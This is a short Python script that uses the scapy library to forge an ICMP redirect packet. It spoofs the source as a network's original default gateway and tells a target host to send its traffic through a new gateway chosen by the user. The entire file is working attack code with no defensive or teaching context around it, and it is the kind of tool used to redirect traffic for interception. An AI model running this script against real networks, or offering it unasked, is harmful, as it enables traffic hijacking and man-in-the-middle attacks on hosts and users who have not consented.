from scapy.all import send, IP, ICMP


def main():
    target = input("Enter address of target to send to: ")
    old_gw = input("Enter address of original default gateway: ")
    new_gw = input("Enter address of new default gateway: ")
    packet = IP(src=old_gw, dst=target)/ICMP(type=5, code=1, gw=new_gw)/IP(src=target, dst="0.0.0.0")
    send(packet)

if __name__=="__main__":
    main()